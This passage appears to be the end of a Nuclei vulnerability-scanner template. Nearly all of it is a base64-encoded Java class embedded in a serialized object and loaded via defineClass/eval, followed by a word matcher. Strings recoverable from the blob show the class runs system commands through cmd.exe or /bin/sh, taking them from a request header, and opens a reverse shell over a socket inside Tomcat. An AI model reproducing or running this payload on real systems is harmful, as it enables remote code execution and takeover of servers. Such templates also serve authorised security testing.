Z0NYQ2dDWUFKa0tBSmdBbWdvQUlnQ2JDQUNjQ2dBZ0FKMEtBSjRBbndvQW5nQ2dCd0NoQ2dDWUFLSUlBSXdLQUNrQW93Z0FwQWdBcFFjQXBnZ0Fwd2dBcUFjQXFRb0FJQUNxQ0FDckNBQ3NCd0N0Q3dBYkFLNExBQnNBcndnQXNBZ0FzUWNBc2dvQUlBQ3pCd0MwQ2dDMUFMWUlBTGNKQUg0QXVBZ0F1UW9BZmdDNkNBQzdCd0M4Q2dCK0FMMEtBQ2tBdmdnQXZ3a0FMZ0RBQndEQkNnQXVBTUlJQU1NS0FINEF4QW9BSUFERkNBREdDUUIrQU1jSUFNZ0tBQ0FBeVFnQXlnY0F5d2dBekFnQXpRb0FtQURPQ2dEUEFNUUlBTkFLQUNrQTBRZ0EwZ29BS1FEVENBRFVDZ0FwQU5VS0FDa0ExZ2dBMXdvQUtRRFlDQURaQ2dBdUFOb0tBSDRBMndnQTNBb0FmZ0RkQ0FEZUNnRGZBT0FLQUNrQTRRZ0E0Z2dBNHdnQTVBY0E1UW9BVVFDWENnQlJBT1lJQU9jS0FGRUE2QWdBNlFnQTZnZ0E2d2dBN0FvQTdRRHVDZ0R0QU84SEFQQUtBUEVBOGdvQVhBRHpDQUQwQ2dCY0FQVUtBRndBOWdvQVhBRDNDZ0R4QVBnS0FQRUErUW9BT0FEb0NBRDZDZ0FwQUpZSUFQc0tBTzBBL0FjQS9Rb0FMZ0QrQ2dCcUFQOEtBR29BOGdvQThRRUFDZ0JxQVFBS0FHb0JBUW9CQWdFRENnRUNBUVFLQVFVQkJnb0JCUUVIQlFBQUFBQUFBQUF5Q2dDWUFRZ0tBUEVCQ1FvQWFnRUtDQUVMQ2dBNEFKVUlBUXdJQVEwSEFRNEJBQlpqYkdGemN5UnFZWFpoSkd4aGJtY2tVM1J5YVc1bkFRQVJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxUZVc1MGFHVjBhV01CQUFkaGNuSmhlU1JDQVFBR1BHbHVhWFErQVFBREtDbFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFDa1Y0WTJWd2RHbHZibk1CQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFIWlhobFkzVjBaUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUVaWGhsWXdFQUIzSmxkbVZ5YzJVQkFEa29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFaamJHRnpjeVFCQUFwVGIzVnlZMlZHYVd4bEFRQUhRVFF1YW1GMllRd0JEd0NKQVFBZ2FtRjJZUzlzWVc1bkwwTnNZWE56VG05MFJtOTFibVJGZUdObGNIUnBiMjRCQUI1cVlYWmhMMnhoYm1jdlRtOURiR0Z6YzBSbFprWnZkVzVrUlhKeWIzSU1BUkFCRVF3QWd3RVNEQUNEQUlRSEFSTU1BUlFCRlF3QkZnRVhEQUVZQVJrQkFBZDBhSEpsWVdSekRBRWFBUnNIQVJ3TUFSMEJIZ3dCSHdFZ0FRQVRXMHhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd3dCSVFFUkRBRWlBU01CQUFSb2RIUndBUUFHZEdGeVoyVjBBUUFTYW1GMllTOXNZVzVuTDFKMWJtNWhZbXhsQVFBR2RHaHBjeVF3QVFBSGFHRnVaR3hsY2dFQUhtcGhkbUV2YkdGdVp5OU9iMU4xWTJoR2FXVnNaRVY0WTJWd2RHbHZiZ3dCSkFFWkFRQUdaMnh2WW1Gc0FRQUtjSEp2WTJWemMyOXljd0VBRG1waGRtRXZkWFJwYkM5TWFYTjBEQUVsQVNZTUFSOEJKd0VBQTNKbGNRRUFDMmRsZEZKbGMzQnZibk5sQVFBUGFtRjJZUzlzWVc1bkwwTnNZWE56REFFb0FTa0JBQkJxWVhaaEwyeGhibWN2VDJKcVpXTjBCd0VxREFFckFTd0JBQWxuWlhSSVpXRmtaWElNQUg4QWdBRUFFR3BoZG1FdWJHRnVaeTVUZEhKcGJtY01BSThBaVFFQUEyTnRaQUVBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNNQUlvQWl3d0JMUUV1QVFBSmMyVjBVM1JoZEhWekRBRXZBSUFCQUJGcVlYWmhMMnhoYm1jdlNXNTBaV2RsY2d3QWd3RXdBUUFrYjNKbkxtRndZV05vWlM1MGIyMWpZWFF1ZFhScGJDNWlkV1l1UW5sMFpVTm9kVzVyREFDSUFJa01BVEVCTWdFQUNITmxkRUo1ZEdWekRBQ0NBSUFCQUFKYlFnd0JNd0VwQVFBSFpHOVhjbWwwWlFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNEJBQk5xWVhaaExtNXBieTVDZVhSbFFuVm1abVZ5QVFBRWQzSmhjQXdCTkFFMUJ3RTJBUUFBREFFM0FUZ0JBQkJqYjIxdFlXNWtJRzV2ZENCdWRXeHNEQUU1QVJFQkFBVWpJeU1qSXd3Qk9nRTdEQUU4QVQwQkFBRTZEQUUrQVQ4QkFDSmpiMjF0WVc1a0lISmxkbVZ5YzJVZ2FHOXpkQ0JtYjNKdFlYUWdaWEp5YjNJaERBRkFBVUVNQUkwQWpnRUFCVUJBUUVCQURBQ01BSXNCQUFkdmN5NXVZVzFsQndGQ0RBRkRBSXNNQVVRQkVRRUFBM2RwYmdFQUJIQnBibWNCQUFJdGJnRUFGbXBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV1ptWlhJTUFVVUJSZ0VBQlNBdGJpQTBEQUZIQVJFQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NCU0F3QlNRRktEQUNNQVVzQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0JUQXdCVFFGT0RBQ0RBVThCQUFKY1lRd0JVQUZSREFGU0FWTU1BVlFCRVF3QlZRRk9EQUZXQUlRQkFBY3ZZbWx1TDNOb0FRQUhZMjFrTG1WNFpRd0FqQUZYQVFBUGFtRjJZUzl1WlhRdlUyOWphMlYwREFGWUFTWU1BSU1CV1F3QldnRmJEQUZjQVZNSEFWME1BVjRCSmd3Qlh3RW1Cd0ZnREFGaEFUQU1BV0lBaEF3Qll3RmtEQUZsQVNZTUFXWUFoQUVBSFhKbGRtVnljMlVnWlhobFkzVjBaU0JsY25KdmNpd2diWE5uSUMwK0FRQUJJUUVBRTNKbGRtVnljMlVnWlhobFkzVjBaU0J2YXlFQkFBSkJOQUVBQjJadmNrNWhiV1VCQUFwblpYUk5aWE56WVdkbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkJxWVhaaEwyeGhibWN2VkdoeVpXRmtBUUFOWTNWeWNtVnVkRlJvY21WaFpBRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VWFISmxZV1E3QVFBT1oyVjBWR2h5WldGa1IzSnZkWEFCQUJrb0tVeHFZWFpoTDJ4aGJtY3ZWR2h5WldGa1IzSnZkWEE3QVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQUYycGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrQVFBTmMyVjBRV05qWlhOemFXSnNaUUVBQkNoYUtWWUJBQU5uWlhRQkFDWW9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQjJkbGRFNWhiV1VCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFEV2RsZEZOMWNHVnlZMnhoYzNNQkFBUnphWHBsQVFBREtDbEpBUUFWS0VrcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUpaMlYwVFdWMGFHOWtBUUJBS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzF0TWFtRjJZUzlzWVc1bkwwTnNZWE56T3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrT3dFQUdHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwMWxkR2h2WkFFQUJtbHVkbTlyWlFFQU9TaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREdGJUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQkZSWlVFVUJBQVFvU1NsV0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFFV2RsZEVSbFkyeGhjbVZrVFdWMGFHOWtBUUFWWjJWMFEyOXVkR1Y0ZEVOc1lYTnpURzloWkdWeUFRQVpLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUJtVnhkV0ZzY3dFQUZTaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BXZ0VBQkhSeWFXMEJBQXB6ZEdGeWRITlhhWFJvQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bGFBUUFIY21Wd2JHRmpaUUVBUkNoTWFtRjJZUzlzWVc1bkwwTm9ZWEpUWlhGMVpXNWpaVHRNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFGYzNCc2FYUUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1Z0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBZDJZV3gxWlU5bUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDBsdWRHVm5aWEk3QVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBWmhjSEJsYm1RQkFDd29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZtWm1WeU93RUFDSFJ2VTNSeWFXNW5BUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFPWjJWMFJYSnliM0pUZEhKbFlXMEJBQWRrWlhOMGNtOTVBUUFuS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxQnliMk5sYzNNN0FRQUlhVzUwVm1Gc2RXVUJBQllvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3U1NsV0FRQVBaMlYwVDNWMGNIVjBVM1J5WldGdEFRQVlLQ2xNYW1GMllTOXBieTlQZFhSd2RYUlRkSEpsWVcwN0FRQUlhWE5EYkc5elpXUUJBQk5xWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0QVFBSllYWmhhV3hoWW14bEFRQUVjbVZoWkFFQUZHcGhkbUV2YVc4dlQzVjBjSFYwVTNSeVpXRnRBUUFGZDNKcGRHVUJBQVZtYkhWemFBRUFCWE5zWldWd0FRQUVLRW9wVmdFQUNXVjRhWFJXWVd4MVpRRUFCV05zYjNObEFDRUFmZ0FpQUFBQUFnQUlBSDhBZ0FBQkFJRUFBQUFBQUFnQWdnQ0FBQUVBZ1FBQUFBQUFCZ0FCQUlNQWhBQUNBSVVBQUFRUkFBZ0FFUUFBQXRFcXR3QUd1QUFIdGdBSVRDdTJBQWtTQ3JZQUMwMHNCTFlBREN3cnRnQU53QUFPd0FBT1RnTTJCQlVFTGI2aUFxTXRGUVF5T2dVWkJjY0FCcWNDanhrRnRnQVBPZ1laQmhJUXRnQVJtZ0FOR1FZU0VyWUFFWm9BQnFjQ2NSa0Z0Z0FKRWhPMkFBdE5MQVMyQUF3c0dRVzJBQTA2QnhrSHdRQVVtZ0FHcHdKT0dRZTJBQWtTRmJZQUMwMHNCTFlBREN3WkI3WUFEVG9IR1FlMkFBa1NGcllBQzAybkFCWTZDQmtIdGdBSnRnQVl0Z0FZRWhhMkFBdE5MQVMyQUF3c0dRZTJBQTA2QnhrSHRnQUp0Z0FZRWhtMkFBdE5wd0FRT2dnWkI3WUFDUkladGdBTFRTd0V0Z0FNTEJrSHRnQU5PZ2NaQjdZQUNSSWF0Z0FMVFN3RXRnQU1MQmtIdGdBTndBQWJ3QUFiT2dnRE5na1ZDUmtJdVFBY0FRQ2lBYWdaQ0JVSnVRQWRBZ0E2Q2hrS3RnQUpFaDYyQUF0TkxBUzJBQXdzR1FxMkFBMDZDeGtMdGdBSkVoOER2UUFndGdBaEdRc0R2UUFpdGdBak9nd1pDN1lBQ1JJa0JMMEFJRmtEc2dBbHh3QVBFaWE0QUNkWnN3QWxwd0FHc2dBbFU3WUFJUmtMQkwwQUlsa0RFaWhUdGdBandBQXBPZzBaRGNjQUJxY0JKU29aRGJZQUtyWUFLem9PR1F5MkFBa1NMQVM5QUNCWkE3SUFMVk8yQUNFWkRBUzlBQ0paQTdzQUxsa1JBTWkzQUM5VHRnQWpWeW9TTUxZQU1Ub1BHUSsyQURJNkJ4a1BFak1HdlFBZ1dRT3lBRFRIQUE4U05iZ0FKMW16QURTbkFBYXlBRFJUV1FTeUFDMVRXUVd5QUMxVHRnQTJHUWNHdlFBaVdRTVpEbE5aQkxzQUxsa0R0d0F2VTFrRnV3QXVXUmtPdnJjQUwxTzJBQ05YR1F5MkFBa1NOd1M5QUNCWkF4a1BVN1lBSVJrTUJMMEFJbGtER1FkVHRnQWpWNmNBWWpvUEtoSTV0Z0F4T2hBWkVCSTZCTDBBSUZrRHNnQTB4d0FQRWpXNEFDZFpzd0EwcHdBR3NnQTBVN1lBTmhrUUJMMEFJbGtER1E1VHRnQWpPZ2NaRExZQUNSSTNCTDBBSUZrREdSQlR0Z0FoR1F3RXZRQWlXUU1aQjFPMkFDTlhwd0FYaEFrQnAvNVNwd0FJT2dhbkFBT0VCQUduL1Z5eEFBZ0Fsd0NpQUtVQUZ3REZBTk1BMWdBWEFkQUNWd0phQURnQU5nQTdBc1VBT0FBK0FGa0N4UUE0QUZ3QWZBTEZBRGdBZndLNUFzVUFPQUs4QXNJQ3hRQTRBQUVBaGdBQUFPNEFPd0FBQUEwQUJBQU9BQXNBRHdBVkFCQUFHZ0FSQUNZQUV3QXdBQlFBTmdBV0FENEFGd0JGQUJnQVhBQVpBR2NBR2dCc0FCc0FkQUFjQUg4QUhRQ0tBQjRBandBZkFKY0FJUUNpQUNRQXBRQWlBS2NBSXdDNEFDVUF2UUFtQU1VQUtBRFRBQ3NBMWdBcEFOZ0FLZ0RqQUN3QTZBQXRBUEFBTGdEN0FDOEJBQUF3QVE0QU1RRWRBRElCS0FBekFUTUFOQUU0QURVQlFBQTJBVmtBTndHU0FEZ0Jsd0E1QVpvQU93R2xBRHdCMEFBK0FkZ0FQd0hmQUVBQ05RQkJBbGNBUmdKYUFFSUNYQUJEQW1RQVJBS1hBRVVDdVFCSEFyd0FNUUxDQUVzQ3hRQkpBc2NBU2dMS0FCTUMwQUJOQUljQUFBQUVBQUVBT0FBQkFJZ0FpUUFDQUlVQUFBQTVBQUlBQXdBQUFCRXJ1QUFCc0UyNEFBZTJBRHNydGdBOHNBQUJBQUFBQkFBRkFBSUFBUUNHQUFBQURnQURBQUFBVndBRkFGZ0FCZ0JaQUljQUFBQUVBQUVBQWdBQkFJb0Fpd0FCQUlVQUFBQ1BBQVFBQXdBQUFGY3J4Z0FNRWowcnRnQSttUUFHRWord0s3WUFRRXdyRWtHMkFFS1pBQ2dyRWtFU1BiWUFReEpFdGdCRlRTeStCWjhBQmhKR3NDb3NBeklzQkRLNEFFZTJBRWl3S2lzU1FSSTl0Z0JERWtrU1BiWUFRN1lBU3JBQUFBQUJBSVlBQUFBbUFBa0FBQUJqQUEwQVpBQVFBR1lBRlFCbkFCNEFhUUFzQUdvQU1nQnJBRFVBYlFCREFHOEFBUUNNQUlzQUFRQ0ZBQUFCeWdBRUFBa0FBQUVxRWt1NEFFeTJBRTFOSzdZQVFFd0JUZ0U2QkN3U1RyWUFFWmtBUUNzU1Q3WUFFWmtBSUNzU1VMWUFFWm9BRjdzQVVWbTNBRklydGdCVEVsUzJBRk8yQUZWTUJyMEFLVmtERWloVFdRUVNWbE5aQlN0VE9nU25BRDByRWsrMkFCR1pBQ0FyRWxDMkFCR2FBQmU3QUZGWnR3QlNLN1lBVXhKWHRnQlR0Z0JWVEFhOUFDbFpBeEpZVTFrRUVsbFRXUVVyVXpvRXVBQmFHUVMyQUZ0T3V3QmNXUzIyQUYyM0FGNFNYN1lBWURvRkdRVzJBR0daQUFzWkJiWUFZcWNBQlJJOU9nYTdBRnhaTGJZQVk3Y0FYaEpmdGdCZ09nVzdBRkZadHdCU0dRYTJBRk1aQmJZQVlaa0FDeGtGdGdCaXB3QUZFajIyQUZPMkFGVTZCaGtHT2djdHhnQUhMYllBWkJrSHNEb0ZHUVcyQUdVNkJpM0dBQWN0dGdCa0dRYXdPZ2d0eGdBSExiWUFaQmtJdndBRUFKTUEvZ0VKQURnQWt3RCtBUjBBQUFFSkFSSUJIUUFBQVIwQkh3RWRBQUFBQVFDR0FBQUFiZ0FiQUFBQWN3QUpBSFFBRGdCMUFCQUFkZ0FUQUhjQUhBQjRBQzRBZVFCQ0FIc0FXUUI5QUdzQWZnQi9BSUFBa3dDREFKd0FoQUN1QUlVQXdnQ0dBTlFBaHdENkFJZ0EvZ0NNQVFJQWpRRUdBSWdCQ1FDSkFRc0FpZ0VTQUl3QkZnQ05BUm9BaWdFZEFJd0JJd0NOQUFFQWpRQ09BQUVBaFFBQUFZTUFCQUFNQUFBQTh4Skx1QUJNdGdCTkVrNjJBQkdhQUJDN0FDbFpFbWEzQUdkT3B3QU51d0FwV1JKb3R3Qm5UcmdBV2kyMkFHazZCTHNBYWxrckxMWUFhN2NBYkRvRkdRUzJBRjA2QmhrRXRnQmpPZ2NaQmJZQWJUb0lHUVMyQUc0NkNSa0Z0Z0J2T2dvWkJiWUFjSm9BWUJrR3RnQnhuZ0FRR1FvWkJyWUFjcllBYzZmLzdoa0h0Z0J4bmdBUUdRb1pCN1lBY3JZQWM2Zi83aGtJdGdCeG5nQVFHUWtaQ0xZQWNyWUFjNmYvN2hrS3RnQjBHUW0yQUhRVUFIVzRBSGNaQkxZQWVGZW5BQWc2QzZmL25oa0V0Z0JrR1FXMkFIbW5BQ0JPdXdCUldiY0FVaEo2dGdCVExiWUFlN1lBVXhKOHRnQlR0Z0JWc0JKOXNBQUNBTGdBdmdEQkFEZ0FBQURRQU5NQU9BQUJBSVlBQUFCdUFCc0FBQUNiQUJBQW5BQWRBSjRBSndDZ0FEQUFvUUErQUtJQVV3Q2pBR0VBcEFCcEFLVUFjUUNtQUg0QXFBQ0dBS2tBa3dDckFKc0FyQUNvQUs0QXJRQ3ZBTElBc0FDNEFMSUF2Z0N6QU1FQXRBRERBTFVBeGdDM0FNc0F1QURRQUxzQTB3QzVBTlFBdWdEd0FMd0FDQUNQQUlrQUFnQ0ZBQUFBTWdBREFBSUFBQUFTS3JnQUFiQk11d0FEV1N1MkFBUzNBQVcvQUFFQUFBQUVBQVVBQWdBQkFJWUFBQUFHQUFFQUFBQTNBSUVBQUFBQUFBRUFrQUFBQUFJQWtRPT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=")}}



    matchers:

      - type: word

        words:

          - 'Test'

```

